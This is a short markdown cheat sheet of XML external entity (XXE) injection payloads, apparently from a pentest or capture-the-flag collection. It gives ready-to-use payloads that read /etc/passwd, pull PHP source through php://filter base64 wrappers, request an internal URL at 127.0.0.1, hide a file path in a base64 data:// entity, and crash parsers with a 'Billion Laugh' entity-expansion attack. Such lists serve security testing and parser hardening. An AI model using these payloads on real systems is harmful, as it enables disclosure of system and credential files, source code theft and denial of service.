# XML Injection


### Read etc/passwd without encoding
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<post>
	<poster>vbvebre</poster>
	<content>&xxe;</content>
</post>
```

### Read a file and base64 encode it for display

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY c SYSTEM "php://filter/read=convert.base64-encode/resource=view_order.php">
]>
<order>
    <item>
        <name>&c;</name>
        <amount>14</amount>
    </item>
</order>
```

### Read a file from a URL 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1/secret"> ]>

<post>
	<poster>vbvebre</poster>
	<content>&xxe;</content>
</post>
```


### Read a python file

```xml
<xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:feed.py'>]>
<test>
<Author>&test;</Author>
<Subject>test</Subject>
<Content>test</Content>
</test>
```

### Base64 Encoded

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### Billion Laugh Attack
```
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### PHP Wrapper
```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

